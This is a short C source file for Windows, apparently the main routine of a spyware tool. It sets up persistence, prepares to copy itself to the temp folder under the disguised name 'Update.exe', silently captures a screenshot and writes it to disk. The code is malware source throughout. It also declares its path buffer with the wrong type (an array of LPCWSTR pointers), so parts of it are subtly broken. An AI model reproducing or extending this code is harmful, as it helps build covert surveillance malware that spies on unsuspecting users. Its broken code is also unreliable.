#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include "common.h"

#pragma comment(lib, "Shlwapi.lib")

int main( void )
{
	PVOID pAddress = NULL;
	ULONG Length = 0x00;
	LPCWSTR tempPath[ MAX_PATH ];

	/* ---------------------------------------------------------------------------------------------------------------------------------------- */

	if ( !ActivatePersistance() )
	{
		return -1;
	}

	if ( !GetTempPathW( MAX_PATH, &tempPath ) )
	{
		LOG_ERR( "GetTempPathW" );
		return -1;
	}
	StrCatW( &tempPath, L"Update.exe" );

	//		<><><><><><>[ NEXT COPY TO TEMP DIRECTORY ]<><><><><><>

	/* ---------------------------------------------------------------------------------------------------------------------------------------- */

	// store screenshot in memory
	if ( !ScreenshotBmp( &pAddress, &Length ) )
	{
		return -1;
	}
	printf( "(+) Screenshot Captured...\n" );

	// write the screenshot to disk
	if ( !WriteFileToDiskA( "screenshot.bmp", pAddress, Length ) )
	{
		return -1;
	}
	printf( "(+) Screenshot has been written to disk...\n" );

	// free the buffer
	RtlSecureZeroMemory( pAddress, Length );
	HeapFree( GetProcessHeap(), HEAP_ZERO_MEMORY, pAddress );

	return 0;
}
